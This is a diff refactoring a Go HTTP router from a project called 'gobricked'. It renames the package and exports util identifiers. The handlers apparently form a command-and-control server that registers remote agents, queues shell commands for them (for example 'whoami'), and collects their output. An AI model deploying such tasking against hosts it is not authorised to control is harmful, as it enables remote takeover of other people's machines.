@@ -1,13 +1,12 @@
-package routers
+package router
 
 import (
 	"encoding/json"
 	"fmt"
+	"gobricked/pkg/util"
 	"log"
 	"net/http"
 	"time"
-
-	"gobricked/util"
 
 	"github.com/google/uuid"
 	"github.com/gorilla/mux"
@@ -20,13 +19,13 @@ func registerAgentHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	util.mutex.Lock()
-	defer util.mutex.Unlock()
+	util.Mutex.Lock()
+	defer util.Mutex.Unlock()
 
 	agentID := uuid.New().String()
 	agent.ID = agentID
 	agent.LastSeen = time.Now()
-	util.agents[agentID] = agent
+	util.Agents[agentID] = agent
 
 	log.Printf("[+] Registered agent %s (%s)", agentID, agent.Hostname)
 	w.Header().Set("Content-Type", "application/json")
@@ -36,16 +35,16 @@ func registerAgentHandler(w http.ResponseWriter, r *http.Request) {
 func getTasksHandler(w http.ResponseWriter, r *http.Request) {
 	agentID := mux.Vars(r)["agentID"]
 
-	util.mutex.Lock()
-	defer util.mutex.Unlock()
+	util.Mutex.Lock()
+	defer util.Mutex.Unlock()
 
-	agentTasks := util.tasks[agentID]
+	agentTasks := util.Tasks[agentID]
 	exampleTask := util.Task{
 		ID:      "task-01",
 		Command: "whoami",
 	}
 	agentTasks = append(agentTasks, exampleTask)
-	util.tasks[agentID] = []util.Task{}
+	util.Tasks[agentID] = []util.Task{}
 
 	log.Printf("[>] Agent %s pulled %d task(s)", agentID, len(agentTasks))
 	w.Header().Set("Content-Type", "application/json")
@@ -62,14 +61,14 @@ func postTaskHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	util.mutex.Lock()
-	defer util.mutex.Unlock()
+	util.Mutex.Lock()
+	defer util.Mutex.Unlock()
 
 	newTask := util.Task{
 		ID:      uuid.New().String(),
 		Command: task.Command,
 	}
-	util.tasks[task.AgentID] = append(util.tasks[task.AgentID], newTask)
+	util.Tasks[task.AgentID] = append(util.Tasks[task.AgentID], newTask)
 
 	log.Printf("[*] Added task %s to agent %s", newTask.ID, task.AgentID)
 	w.WriteHeader(http.StatusCreated)
@@ -86,10 +85,10 @@ func postResultHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	util.mutex.Lock()
-	defer util.mutex.Unlock()
+	util.Mutex.Lock()
+	defer util.Mutex.Unlock()
 
-	util.results = append(util.results, result)
+	util.Results = append(util.Results, result)
 	log.Printf("[✓] Received result for task (%s) from agent (%s) > %s", result.TaskID, result.AgentID, result.Output)
 	w.WriteHeader(http.StatusCreated)
 }
